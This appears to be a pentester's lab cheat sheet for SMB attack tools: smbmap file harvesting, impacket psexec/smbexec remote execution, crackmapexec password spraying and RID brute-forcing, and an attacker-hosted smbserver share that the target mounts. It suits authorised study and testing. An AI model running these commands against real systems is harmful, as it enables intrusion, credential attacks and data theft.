---
tags:
  - SMB
  - impacket
  - smbclient
  - PY-psexec
  - PY-smbclient
  - PY-smbexec
  - p445
  - p139
  - cme-smb
  - smbmap
---


## SMBClient
- list available shares with -L
		- `smbclient -L 10.129.220.145 -U administrator`
- Connect to a share
		- `smbclient \\\\10.129.220.145\\ADMIN$ -U Administrator`

## SMBMap
- list available shares
	- `smbmap -H 10.129.68.211 -u guest`
	- `smbmap -H 10.129.68.211 -u administrator -p password123`
- recursively list dirs and files (-R)
	- `smbmap -u Tempuser -p welcome2019 -H 10.129.68.211 -R Data`
	- `smbmap -u Tempuser -p welcome2019 -H 10.129.68.211 -R Secure$\\IT`
- Download all files matching a regex pattern (-A)
	- `smbmap -u Tempuser -p welcome2019 -H 10.129.68.211 -R Data -A xml`


## Mount a file share locally
- `sudo mount -t cifs "//10.129.68.211/Secure$/IT/Carl" /mnt/Data -o username=TempUser,password=welcome2019`
- remember that the `/mnt/Data` (or whatever) must exist
- you can also do this with anonymous auth (guest)
	- `sudo mount -t cifs "//10.129.68.211/Users" /mnt/Data2 -o username=guest,password=`
## impacket psexec.py
- `python psexec.py username:password@hostIP
- useful for if you enumerate open administrative shares or have access to these shares using creds


## impacket smbexec.py
- `python smbexec.py Administrator@10.129.220.145
- useful for if you enumerate open administrative shares or have access to these shares using creds


## crackmapexec
- `cme smb 10.129.96.157 -u users.txt -p passwords.txt`
- `cme smb 10.129.96.157 -u hazard -p stealth1agent --rid-brute` to brute force RID's and enumerate local user account names


## smbserver.py
- host an smb server off your attacking endpoint 
	- `smbserver.py -smb2support -username guest -password guest share /root/Desktop`
	- mount this on your target (if windows) `net use x: \\10.10.14.177\share /user:guest guest`